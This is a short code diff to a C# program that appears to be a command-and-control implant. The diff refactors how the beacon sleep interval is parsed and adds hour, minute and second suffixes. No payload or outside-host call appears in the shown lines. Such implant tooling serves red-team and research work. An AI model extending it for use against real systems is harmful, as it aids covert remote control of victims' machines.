@@ -281,6 +281,21 @@ public class Program
 		}
 		return sOut;
 	}
+
+	static int Parse_Beacon_Time(string time, string unit)
+	{
+		int beacontime = Int32.Parse(time);
+		switch (unit)
+		{
+			case "h":
+				beacontime *= 3600;
+				break;
+			case "m":
+				beacontime *= 60;
+				break;
+		}
+		return beacontime;
+	}
 	
 	internal static class UrlGen
 	{
@@ -341,9 +356,13 @@ public class Program
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
 		ImgGen.Init(stringIMGS);
-	  int beacontime = 5;
-		if (!Int32.TryParse(Sleep, out beacontime))
-			beacontime = 5;
+		int beacontime = 5;
+		var ibcnRgx = new Regex(@"(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+		var imch = ibcnRgx.Match(Sleep);
+		if (imch.Success)
+		{
+			beacontime = Parse_Beacon_Time(imch.Groups["t"].Value, imch.Groups["u"].Value);
+		}
 	
 		var strOutput = new StringWriter();
 		Console.SetOut(strOutput);
@@ -463,16 +482,7 @@ public class Program
 							var mch = bcnRgx.Match(c);
 							if (mch.Success)
 							{
-								beacontime = Int32.Parse(mch.Groups["t"].Value);
-								switch (mch.Groups["u"].Value)
-								{
-									case "h":
-										beacontime *= 3600;
-										break;
-									case "m":
-										beacontime *= 60;
-										break;
-								}
+								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
 							}
 							else
 								output.AppendLine($@"[X] Invalid time ""{c}""");
